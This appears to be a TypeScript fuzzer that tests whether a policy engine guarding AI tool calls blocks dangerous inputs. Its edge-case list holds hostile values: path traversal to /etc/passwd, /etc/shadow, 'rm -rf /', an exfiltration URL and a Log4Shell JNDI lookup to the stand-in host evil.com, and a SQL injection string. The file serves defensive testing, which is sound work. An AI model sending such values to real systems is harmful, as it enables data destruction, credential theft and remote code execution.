import { generate } from "json-schema-faker";
import type { PolicyEngine } from "../policy/engine.js";

interface FuzzResult {
  toolName: string;
  totalTested: number;
  blocked: number;
  allowed: number;
  bypasses: Array<{
    payload: unknown;
    expectedAction: "deny" | "warn";
    actualAction: string;
    description: string;
  }>;
}

const EDGE_CASES: Array<{ key: string; value: string }> = [
  { key: "path", value: "../../etc/passwd" },
  { key: "command", value: "rm -rf /" },
  { key: "url", value: "http://evil.com/steal?data=" },
  { key: "filePath", value: "/etc/shadow" },
  { key: "host", value: "127.0.0.1" },
  { key: "input", value: "\x00admin\x00" },
  { key: "query", value: "'; DROP TABLE users; --" },
  { key: "username", value: "${jndi:ldap://evil.com/a}" },
];

export async function fuzzTool(
  toolName: string,
  toolSchema: object | undefined,
  policy: PolicyEngine,
  options: { iterations?: number; sessionId?: string } = {}
): Promise<FuzzResult> {
  const iterations = options.iterations ?? 100;

  const result: FuzzResult = {
    toolName,
    totalTested: 0,
    blocked: 0,
    allowed: 0,
    bypasses: [],
  };

  for (let i = 0; i < iterations; i++) {
    let payload: Record<string, unknown>;

    try {
      const generated = toolSchema
        ? await generate(toolSchema as never, { useDefaultValue: true })
        : {};
      payload = (generated && typeof generated === "object" && !Array.isArray(generated))
        ? generated as Record<string, unknown>
        : {};
    } catch {
      payload = {};
    }

    for (const ec of EDGE_CASES) {
      if (!(ec.key in payload)) {
        payload[ec.key] = ec.value;
      }
    }

    const policyResult = policy.evaluate(toolName, "", payload);
    result.totalTested++;

    if (policyResult.action === "deny") {
      result.blocked++;
    } else {
      result.allowed++;
      for (const ec of EDGE_CASES) {
        if (payload[ec.key] === ec.value) {
          result.bypasses.push({
            payload: JSON.stringify(payload).slice(0, 200),
            expectedAction: "deny",
            actualAction: policyResult.action,
            description: `Edge case '${ec.key}=${ec.value}' passed policy checks`,
          });
        }
      }
    }
  }

  return result;
}

export async function fuzzServer(
  serverName: string,
  tools: Array<{ name: string; inputSchema?: object }>,
  policy: PolicyEngine,
  options: { iterations?: number } = {}
): Promise<FuzzResult[]> {
  const results: FuzzResult[] = [];

  for (const tool of tools) {
    const r = await fuzzTool(tool.name, tool.inputSchema, policy, options);
    results.push(r);
  }

  return results;
}

export { FuzzResult };
